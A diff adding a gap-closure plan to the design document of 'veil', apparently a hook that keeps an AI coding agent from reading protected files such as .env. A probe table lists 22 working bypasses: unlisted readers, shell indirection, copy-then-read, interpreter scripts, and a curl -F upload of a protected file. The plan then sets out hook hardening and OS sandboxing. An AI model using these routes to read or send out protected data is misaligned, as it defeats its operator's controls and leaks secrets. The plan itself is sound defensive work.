@@ -414,3 +414,85 @@ If budget exceeded → allow with audit log (fail-open).
 10. **CLI subcommands** — test, explain, scan, packs, doctor
 11. **Installer** — curl | bash, homebrew formula
 12. **Hardening** — Symlink resolution, path traversal, edge cases
+
+---
+
+## Gap Closure Plan — 2026-09-02 reality check
+
+### Where we actually are
+
+`veil` 0.4.1 is installed, healthy, and has stopped real reads of `.env` and
+`~/.cmdrvl/config`. But it is a shell-text parser with a fixed reader list.
+A 36-vector probe against a protected directory allowed 22 reads:
+
+| Class | Allowed today |
+|-------|---------------|
+| Unlisted readers | awk, sed, base64, xxd, perl, jq, sqlite3, duckdb, grep, rg |
+| Shell indirection | `sh -c "cat …"`, `find -exec cat`, xargs, `$(cat …)`, `f=…; cat $f` |
+| Copy-then-read | `cp data/x.csv /tmp && cat /tmp/x.csv`, `tar … \| base64` |
+| Interpreter scripts | `python3 script.py`, `uv run python -c …` |
+| Direct egress | `curl -F file=@data/x.csv https://…` |
+| Grep tool | content mode on a directory (file path is denied, directory is not) |
+
+Parser denylisting cannot win against indirection. The plan below has two
+tracks: **Track A** hardens the hook so it is honest and much harder to trip
+over accidentally; **Track B** adds OS-level enforcement so the claim
+"the agent cannot read protected paths" is mechanically true.
+
+### Track A — hook hardening (ships in 0.5)
+
+1. **Path-anywhere-in-argv rule.** Any simple command whose argv resolves a
+   protected path is resolved through policy unless the command is an
+   authorized spine tool. This replaces the reader allowlist as the primary
+   rule and covers awk/sed/jq/base64/cp/tar/curl/scp in one move.
+2. **Shell decomposition.** Split compound commands on `;`, `&&`, `||`, `|`,
+   `$(…)`, backticks; unwrap `sh|bash|zsh -c`, `env`, `nice`, `time`,
+   `xargs`, `find -exec`, `uv run`, `pipx run`, `poetry run`, `npx`.
+   Evaluate every simple command.
+3. **Dynamic-argument stance.** A reader or egress command with unresolvable
+   `$VAR` / glob args, evaluated with a protected directory in scope, is
+   denied with reason `dynamic_path_unresolvable`. Operators rewrite to a
+   literal path. Configurable via `[policy] dynamic_args`.
+4. **Interpreter script inspection.** `python3 x.py` / `node x.js` etc.: veil
+   reads the script (bounded, 256 KiB) and applies the same path + accessor
+   extraction used for `-c` strings.
+5. **Directory-scope Grep.** Grep tool content mode and Bash grep/rg on a
+   directory that contains protected patterns is denied.
+6. **Egress commands.** curl/wget/scp/rsync/aws/gh/gsutil/az with a protected
+   path in argv are denied as `egress`, a distinct reason class in the audit
+   log.
+7. **Enforcement-level honesty.** `veil doctor`, the audit log, and the
+   README report `enforcement: hook-only` or `enforcement: sandboxed`. The
+   36-vector probe becomes a committed test matrix with expected outcomes so
+   README claims are generated from tests, not prose.
+
+### Track B — OS sandbox enforcement (1.0)
+
+```
+veil sandbox -- claude          # launches the harness inside a sandbox
+   │  protected paths: deny file-read* (seatbelt on macOS, Landlock on Linux)
+   │  hooks still run for UX + audit
+   └─ veil exec shape data/x.csv  # broker: runs an authorized spine tool
+                                  # OUTSIDE the sandbox with operator perms,
+                                  # returns stdout/stderr only
+```
+
+- The policy compiler emits a seatbelt profile / Landlock ruleset from the
+  merged config (protected globs → deny read; everything else inherited).
+- The broker is a unix-socket daemon started by `veil sandbox`; it accepts
+  `{tool, argv}` only for tools in `[spine] authorized_tools`, never a shell
+  string, and records every invocation in the audit log.
+- `sandbox-exec` is deprecated but functional on macOS 26; Endpoint Security
+  needs entitlements and is out of scope. Document the risk and keep the
+  Landlock backend as the reference implementation.
+
+### Non-goals restated
+
+Write/Edit guarding and PostToolUse output filtering remain out of scope.
+Outbound *message body* policy stays with the calling wrapper / KOVREX.
+
+### Tracking
+
+Beads created 2026-09-02 under the epic "Veil v1: honest hook + sandbox
+enforcement". Existing backlog bypass beads (bd-28k, bd-r93, bd-3pm, bd-hf9)
+are linked as related and superseded by Track A items.
